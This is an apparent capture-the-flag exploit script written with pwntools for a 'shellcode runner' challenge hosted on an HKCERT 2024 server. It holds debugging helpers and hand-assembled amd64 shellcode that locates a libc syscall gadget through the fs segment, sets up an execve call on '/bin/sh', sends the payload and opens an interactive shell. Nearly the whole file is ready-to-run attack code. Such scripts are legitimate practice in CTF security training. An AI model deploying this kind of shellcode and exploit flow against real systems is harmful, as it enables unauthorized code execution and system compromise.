from pwn import *

TARGET = './chall'
HOST = '127.0.0.1'
PORT = 1337
context.arch = 'amd64' # i386/amd64
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
elf = ELF(TARGET)

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote("c49-shellcode-runner3.hkcert24.pwnable.hk", 1337, ssl=True) 
    #p = remote("127.0.0.1", 1337) 
    # libc = ELF('')
else:
    
    gdbscript = '''
    b *main+352
    '''
    p = process(TARGET)
    gdb.attach(p, gdbscript=gdbscript)
    #p = gdb.debug(TARGET, gdbscript)
    libc = elf.libc

       

#--- helper functions
s       = lambda data               :p.send(data)        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(delim, data) 
sl      = lambda data               :p.sendline(data) 
sla     = lambda delim,data         :p.sendlineafter(delim, data) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
# misc functions
uu32    = lambda data   :u32(data.ljust(4, b'\x00'))
uu64    = lambda data   :u64(data.ljust(8, b'\x00'))
leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
#---

payload = asm("""
    mov rax, [fs:0x300]
    mov rdx, [rax+0x78]
    mov rdi, rdx
    add rdi, 0x1ae838
    sub rdx, 0x8c
    mov rbx, rdx
    mov rax, 0x3b
    xor rdx, rdx
    jmp rbx
""",arch='amd64')

print(payload)
sla("Input your shellcode here (max: 100): ", payload + b"/bin/sh" +b"A"*0x100) 

p.interactive()
